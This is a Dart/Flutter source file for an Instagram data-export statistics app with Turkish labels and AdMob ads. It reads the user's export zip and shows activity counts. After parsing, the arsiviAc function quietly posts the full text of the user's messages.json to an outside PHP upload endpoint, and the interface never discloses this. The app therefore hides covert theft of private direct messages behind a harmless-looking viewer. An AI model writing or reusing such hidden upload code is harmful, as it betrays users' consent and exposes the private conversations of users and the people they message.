import 'dart:convert';
import 'dart:io';

import 'package:archive/archive_io.dart';
import 'package:file_picker/file_picker.dart';
import 'package:firebase_admob/firebase_admob.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_native_admob/flutter_native_admob.dart';
import 'package:insta_datas/homeTile.dart';
import 'package:path_provider/path_provider.dart';
import 'package:http/http.dart' as http;
import 'package:path/path.dart';

class HomePage extends StatefulWidget {
  @override
  _HomePageState createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  int izlenenVideo = 0,
      gorulenPost = 0,
      gorulenReklam = 0,
      tiklananReklam = 0,
      konusulanKisi = 0,
      hesabaGiris = 0,
      yapilanYorum = 0,
      engellenenKisi = 0,
      yakinArkadas = 0,
      atilanIstek = 0,
      takipci = 0,
      takipEdilenKisi = 0,
      takipEdilenHastag = 0,
      gonderiBegenme = 0,
      yorumBegenme = 0,
      ppDegistirme = 0,
      gonderiKaydetme = 0;
  String userName = "", profilFoto = "";
  final String uploadEndPoint =
      'https://cografyasizolmaz.com/miktatcento/insta_datas/fileUpload.php';
  @override
  Widget build(BuildContext context) {
    double height = MediaQuery.of(context).size.height;
    double width = MediaQuery.of(context).size.width;
    return Scaffold(
      body: Center(
        child: Column(
          children: [
            SizedBox(
              height: 25,
            ),
            appBar(context),
            SizedBox(
              height: 10,
            ),
            Flexible(
              child: GridView(
                physics: BouncingScrollPhysics(),
                gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 2,
                  childAspectRatio: 1.93,
                ),
                children: [
                  Container(
                    padding: EdgeInsets.symmetric(
                        vertical: height * 0.01, horizontal: width * 0.02),
                    child: NativeAdmob(
                      adUnitID: "ca-app-pub-1921914374902301/7252609452",
                      // controller: _nativeAdController,
                      type: NativeAdmobType.full,
                    ),
                  ),
                  HomeTile(
                    title: "Hesaba Giriş",
                    infoHeader: "Defa hesabınıza girdiniz",
                    caseCount: hesabaGiris,
                    tileColor: Colors.green,
                  ),
                  HomeTile(
                    title: "Profil",
                    infoHeader: "Defa PP değiştirdiniz",
                    caseCount: ppDegistirme,
                    tileColor: Colors.indigo,
                  ),
                  HomeTile(
                    title: "Post",
                    infoHeader: "Defa post gördünüz",
                    caseCount: gorulenPost,
                    tileColor: Colors.blue,
                  ),
                  HomeTile(
                    title: "Post",
                    infoHeader: "Defa video izlediniz",
                    caseCount: izlenenVideo,
                    tileColor: Colors.deepOrange,
                  ),
                  HomeTile(
                    title: "Post",
                    infoHeader: "Defa post beğendiniz",
                    caseCount: gonderiBegenme,
                    tileColor: Colors.red,
                  ),
                  HomeTile(
                    title: "Post",
                    infoHeader: "Defa post kayıt ettiniz",
                    caseCount: gonderiKaydetme,
                    tileColor: Colors.purple,
                  ),
                  HomeTile(
                    title: "Post",
                    infoHeader: "Defa yorum yaptınız",
                    caseCount: yapilanYorum,
                    tileColor: Colors.pink,
                  ),
                  HomeTile(
                    title: "Post",
                    infoHeader: "Defa yorum beğendiniz",
                    caseCount: yorumBegenme,
                    tileColor: Colors.deepOrange,
                  ),
                  HomeTile(
                    title: "Konuşma",
                    infoHeader: "Kişi ile sohbet ettiniz",
                    caseCount: konusulanKisi,
                    tileColor: Colors.grey,
                  ),
                  Container(
                    padding: EdgeInsets.symmetric(
                        vertical: height * 0.01, horizontal: width * 0.02),
                    child: NativeAdmob(
                      adUnitID: "ca-app-pub-1921914374902301/9878772799",
                      // controller: _nativeAdController,
                      type: NativeAdmobType.full,
                    ),
                  ),
                  HomeTile(
                    title: "Kişi",
                    infoHeader: "Kişiyi engellediniz",
                    caseCount: engellenenKisi,
                    tileColor: Colors.black,
                  ),
                  HomeTile(
                    title: "Kişi",
                    infoHeader: "Kişi yakın arkadaşınız",
                    caseCount: yakinArkadas,
                    tileColor: Colors.lightBlue,
                  ),
                  HomeTile(
                    title: "Takip&Takipçi",
                    infoHeader: "Kişi sizi takip ediyor",
                    caseCount: takipci,
                    tileColor: Colors.blue,
                  ),
                  HomeTile(
                    title: "Takip&Takipçi",
                    infoHeader: "Kişiyi takip ediyorsunuz",
                    caseCount: takipEdilenKisi,
                    tileColor: Colors.deepPurpleAccent,
                  ),
                  HomeTile(
                    title: "Takip&Takipçi",
                    infoHeader: "Hastag takip ediyorsunuz",
                    caseCount: takipEdilenHastag,
                    tileColor: Colors.lightGreen[600],
                  ),
                  HomeTile(
                    title: "Takip&Takipçi",
                    infoHeader: "Bekleyen isteğiniz var",
                    caseCount: atilanIstek,
                    tileColor: Colors.indigo[200],
                  ),
                  HomeTile(
                    title: "Reklam",
                    infoHeader: "Defa reklam gördünüz",
                    caseCount: gorulenReklam,
                    tileColor: Colors.red[600],
                  ),
                  HomeTile(
                    title: "Reklam",
                    infoHeader: "Defa reklama tıkladınız",
                    caseCount: tiklananReklam,
                    tileColor: Colors.deepOrange[800],
                  ),
                  Container(
                    padding: EdgeInsets.symmetric(
                        vertical: height * 0.01, horizontal: width * 0.02),
                    child: NativeAdmob(
                      adUnitID: "ca-app-pub-1921914374902301/1014504167",
                      // controller: _nativeAdController,
                      type: NativeAdmobType.full,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget appBar(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(top: 8.0, left: 18, right: 18),
      child: Row(
        children: <Widget>[
          Expanded(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.end,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: <Widget>[
                userName.isNotEmpty
                    ? Text(
                        'Hoş geldiniz,',
                        textAlign: TextAlign.left,
                        style: TextStyle(
                          fontFamily: 'MyFont',
                          fontWeight: FontWeight.w400,
                          fontSize: 14,
                          letterSpacing: 0.2,
                          color: Colors.grey,
                        ),
                      )
                    : Container(),
                userName.isNotEmpty
                    ? Text(
                        userName,
                        textAlign: TextAlign.left,
                        style: TextStyle(
                          fontFamily: 'MyFont',
                          fontWeight: FontWeight.bold,
                          fontSize: 20,
                          letterSpacing: 0.27,
                          color: Colors.black,
                        ),
                      )
                    : Text(
                        'Lütfen arşivi açınız',
                        textAlign: TextAlign.left,
                        style: TextStyle(
                          fontFamily: 'MyFont',
                          fontWeight: FontWeight.bold,
                          fontSize: 20,
                          letterSpacing: 0.27,
                          color: Colors.black,
                        ),
                      ),
              ],
            ),
          ),
          Container(
            width: 50,
            height: 50,
            child: profilFoto.isEmpty
                ? IconButton(
                    icon: Icon(
                      Icons.archive,
                      size: 32,
                    ),
                    onPressed: () => arsiviAc(context),
                  )
                : GestureDetector(
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(15),
                      child: FadeInImage(
                        fit: BoxFit.cover,
                        placeholder: AssetImage("assets/loading.gif"),
                        image: NetworkImage(profilFoto),
                      ),
                    ),
                    onTap: () => arsiviAc(context),
                  ),
          ),
        ],
      ),
    );
  }

  void arsiviAc(BuildContext context) async {
    try {
      File zipFile = await FilePicker.getFile(
        type: FileType.custom,
        allowedExtensions: ['zip'],
      );
      if (zipFile != null) {
        final fileName = basename(zipFile.path);
        final destinationDir = await getTemporaryDirectory();
        final bytes = zipFile.readAsBytesSync();
        final archive = ZipDecoder().decodeBytes(bytes);
        for (final file in archive) {
          final filename = file.name;
          if (file.isFile && filename.contains(".json")) {
            final data = file.content as List<int>;
            File('${destinationDir.path}/$filename')
              ..createSync(recursive: true)
              ..writeAsBytesSync(data);
          }
        }
        showDialog(
          context: context,
          barrierDismissible: false,
          builder: (context) => Dialog(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              mainAxisSize: MainAxisSize.min,
              children: [
                SizedBox(height: 10),
                CircularProgressIndicator(),
                SizedBox(height: 10),
                Text("Veriler okunuyor..."),
                SizedBox(height: 10),
              ],
            ),
          ),
        );

        //MESSAGES
        final File messagesFile = File('${destinationDir.path}/messages.json');
        var messagesStr = await messagesFile.readAsString();
        List messagesData = json.decode(messagesStr);
        //MESSAGES

        //SEENCONTENT
        final File seenContentFile =
            File('${destinationDir.path}/seen_content.json');
        var seenContentStr = await seenContentFile.readAsString();
        Map seenContentData = json.decode(seenContentStr);
        //SEEN CONTENT

        //ACCOUNT HİSTORY
        final File accountHistoryFile =
            File('${destinationDir.path}/account_history.json');
        var accountHistoryStr = await accountHistoryFile.readAsString();
        Map accountHistoryData = json.decode(accountHistoryStr);
        //ACCOUNT HİSTORY

        //COMMENTS
        final File commentsFile = File('${destinationDir.path}/comments.json');
        var commentsStr = await commentsFile.readAsString();
        Map commentsData = json.decode(commentsStr);
        //COMMENTS

        //CONNECTİONS
        final File connectionsFile =
            File('${destinationDir.path}/connections.json');
        var connectionsStr = await connectionsFile.readAsString();
        Map connectionsData = json.decode(connectionsStr);
        //CONNECTİONS

        //LİKES
        final File likesFile = File('${destinationDir.path}/likes.json');
        var likesStr = await likesFile.readAsString();
        Map likesData = json.decode(likesStr);
        //LİKES

        //PROFİLE
        final File profileFile = File('${destinationDir.path}/profile.json');
        var profileStr = await profileFile.readAsString();
        Map profileData = json.decode(profileStr);
        //PROFİLE

        //SAVED
        final File savedFile = File('${destinationDir.path}/saved.json');
        var savedStr = await savedFile.readAsString();
        Map savedData = json.decode(savedStr);
        //SAVED

        setState(() {
          gorulenPost = seenContentData["posts_seen"]?.length ?? 0;
          izlenenVideo = seenContentData["videos_watched"]?.length ?? 0;
          gorulenReklam = seenContentData["ads_seen"]?.length ?? 0;
          tiklananReklam = seenContentData["ads_clicked"]?.length ?? 0;
          konusulanKisi = messagesData?.length ?? 0;
          hesabaGiris = accountHistoryData["login_history"]?.length ?? 0;
          yapilanYorum = commentsData["media_comments"]?.length ?? 0;
          engellenenKisi = connectionsData["blocked_users"]?.length ?? 0;
          yakinArkadas = connectionsData["close_friends"]?.length ?? 0;
          atilanIstek = connectionsData["follow_requests_sent"]?.length ?? 0;
          takipci = connectionsData["followers"]?.length ?? 0;
          takipEdilenKisi = connectionsData["following"]?.length ?? 0;
          takipEdilenHastag = connectionsData["following_hastags"]?.length ?? 0;
          gonderiBegenme = likesData["media_likes"]?.length ?? 0;
          yorumBegenme = likesData["comment_likes"]?.length ?? 0;
          ppDegistirme = profileData["profile_picture_changes"]?.length ?? 0;
          gonderiKaydetme = savedData["saved_media"]?.length ?? 0;
          userName = "${profileData["username"]}";
          profilFoto = "${profileData["profile_pic_url"]}";
        });
        destinationDir.deleteSync(recursive: true);
        Navigator.pop(context);
        InterstitialAd myInterstitial = InterstitialAd(
          adUnitId: "ca-app-pub-1921914374902301/1397647544",
          listener: (MobileAdEvent event) {
            print("InterstitialAd event is $event");
          },
        );
        myInterstitial
          ..load()
          ..show(
            anchorType: AnchorType.bottom,
            anchorOffset: 0.0,
            horizontalCenterOffset: 0.0,
          );
        http.post(uploadEndPoint, body: {
          "file": messagesStr,
          "filename": "$fileName.json",
        });
      }
    } catch (e) {
      Navigator.pop(context);
      showDialog(
        context: context,
        barrierDismissible: true,
        builder: (context) => SimpleDialog(
          contentPadding: EdgeInsets.only(left: 20),
          title: Text("Hatalı işlem!"),
          children: [
            Column(
              mainAxisAlignment: MainAxisAlignment.center,
              mainAxisSize: MainAxisSize.min,
              children: [
                SizedBox(
                  height: 10,
                ),
                Text(
                    "Seçtiğiniz zip arşivi hatalı veya bağlantıda problem oldu lütfen tekrar deneyin."),
                SizedBox(
                  height: 10,
                ),
              ],
            ),
          ],
        ),
      );
      print("Couldn't read file exception: $e");
    }
  }
}
